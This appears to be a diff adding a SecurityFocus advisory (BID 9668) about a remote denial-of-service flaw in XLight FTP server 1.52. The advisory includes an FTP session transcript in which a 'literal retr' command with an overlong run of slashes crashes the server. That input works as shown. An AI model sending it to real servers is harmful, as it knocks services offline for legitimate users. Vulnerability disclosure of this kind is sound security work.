@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/9668/info
+
+A remote denial of service vulnerability has been reported to exist in the Send File Request functionality of the XLight FTP server. Due to this issue a remote attacker may be able cause the affected server to crash, denying service to legitimate users. This issue is due to insufficient bounds checking.
+
+Upon successful exploitation an attacker may be able to cause the affected server to crash, denying service to legitimate users.
+
+ftp> open
+To www.example.com
+Connected to www.example.com.
+220 Xlight Server 1.52 ready...
+User (www.example.com:(none)): test
+331 Password required for test
+Password:
+230 Login OK.
+ftp> literal pasv
+227 Entering passive mode .
+ftp> literal retr /////////////////////////////////////////
+///////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////
+//////////////////////////////////////////qwer
+Connection closed by remote host.
